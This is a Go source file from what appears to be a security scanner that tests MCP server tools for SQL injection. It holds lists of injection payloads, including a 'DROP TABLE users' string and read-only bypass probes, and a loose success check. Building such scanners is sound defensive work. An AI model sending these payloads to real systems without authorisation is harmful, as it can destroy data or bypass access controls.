package mcprunner

import (
	"encoding/json"
	"fmt"
	"log"
	"strings"
)

// SQL injection payloads for MCP tool parameters
var GENERIC_PROBES = []string{
	"' OR '1'='1",
	"1; DROP TABLE users--",
	"1 UNION SELECT null,null,null--",
	"' OR 1=1--",
	"admin'--",
	"' OR 'a'='a",
}

// AWS Aurora DSQL CVD pattern - read-only bypass probes
var READ_ONLY_BYPASS_PROBES = []string{
	"SELECT 1; COMMIT",
	"SELECT 1; BEGIN; INSERT INTO test_llmrt_probe VALUES(1)--",
	"SELECT 1; CREATE TABLE test_llmrt_probe_check(id int)--",
	"SELECT 1; SET TRANSACTION READ WRITE--",
}

// TestSQLInjection tests MCP tools for SQL injection vulnerabilities.
//
// Args:
//   - enumerator: MCP enumerator instance
//   - schema: MCP schema with tools
//   - campaignID: Campaign identifier
//
// Returns:
//   - []MCPFinding: List of SQL injection findings
//   - error: If test fails
func TestSQLInjection(enumerator *Enumerator, schema MCPSchema, campaignID string) ([]MCPFinding, error) {
	log.Printf("[SQLInject] Testing %d tools for SQL injection", len(schema.Tools))

	var findings []MCPFinding

	for _, tool := range schema.Tools {
		// Parse input schema to find injectable parameters
		params := extractParameters(tool.InputSchema)

		for _, param := range params {
			// Test with generic probes
			for _, probe := range GENERIC_PROBES {
				finding, err := testToolParameter(enumerator, tool.Name, param, probe, "generic_sqli")
				if err != nil {
					log.Printf("[SQLInject] Error testing %s.%s: %v", tool.Name, param, err)
					continue
				}
				if finding != nil {
					findings = append(findings, *finding)
				}
			}

			// Test with read-only bypass probes
			for _, probe := range READ_ONLY_BYPASS_PROBES {
				finding, err := testToolParameter(enumerator, tool.Name, param, probe, "readonly_bypass")
				if err != nil {
					continue
				}
				if finding != nil {
					findings = append(findings, *finding)
				}
			}
		}
	}

	log.Printf("[SQLInject] Testing complete: %d findings", len(findings))
	return findings, nil
}

// extractParameters extracts parameter names from input schema JSON.
func extractParameters(schemaJSON string) []string {
	var schema map[string]interface{}
	if err := json.Unmarshal([]byte(schemaJSON), &schema); err != nil {
		return nil
	}

	var params []string

	// Extract from properties
	if properties, ok := schema["properties"].(map[string]interface{}); ok {
		for paramName := range properties {
			params = append(params, paramName)
		}
	}

	return params
}

// testToolParameter tests a single tool parameter with a SQL injection payload.
func testToolParameter(enumerator *Enumerator, toolName, paramName, payload, attackType string) (*MCPFinding, error) {
	// Build arguments with injected payload
	args := map[string]interface{}{
		paramName: payload,
	}

	// Call tool
	response, err := enumerator.CallTool(toolName, args)
	if err != nil {
		// Tool call failed - might be due to injection
		return nil, err
	}

	// Detect success
	if isSuccessfulInjection(response, payload) {
		log.Printf("[SQLInject] WARNING: Potential SQL injection in %s.%s", toolName, paramName)

		finding := &MCPFinding{
			AttackType:  attackType,
			ToolName:    toolName,
			Payload:     fmt.Sprintf("%s=%s", paramName, payload),
			Response:    truncateResponse(response, 500),
			FindingType: "sql_injection",
			OOBCallback: false,
			CVSSHint:    8.5, // High severity
		}

		return finding, nil
	}

	return nil, nil
}

// isSuccessfulInjection detects if a response indicates successful SQL injection.
func isSuccessfulInjection(response, payload string) bool {
	responseLower := strings.ToLower(response)

	// Success indicators: response does NOT contain error messages
	errorIndicators := []string{
		"error",
		"invalid",
		"syntax",
		"read only",
		"permission denied",
		"access denied",
		"forbidden",
	}

	for _, indicator := range errorIndicators {
		if strings.Contains(responseLower, indicator) {
			return false
		}
	}

	// If payload contains UNION and response is longer, might be successful
	if strings.Contains(strings.ToUpper(payload), "UNION") && len(response) > 100 {
		return true
	}

	// If payload contains DROP/CREATE and no error, might be successful
	if (strings.Contains(strings.ToUpper(payload), "DROP") ||
		strings.Contains(strings.ToUpper(payload), "CREATE")) &&
		len(response) > 0 {
		return true
	}

	return false
}

// truncateResponse truncates response to specified length.
func truncateResponse(response string, maxLen int) string {
	if len(response) <= maxLen {
		return response
	}
	return response[:maxLen] + "... [truncated]"
}

// GetAllSQLProbes returns all SQL injection probes.
func GetAllSQLProbes() []string {
	var allProbes []string
	allProbes = append(allProbes, GENERIC_PROBES...)
	allProbes = append(allProbes, READ_ONLY_BYPASS_PROBES...)
	return allProbes
}
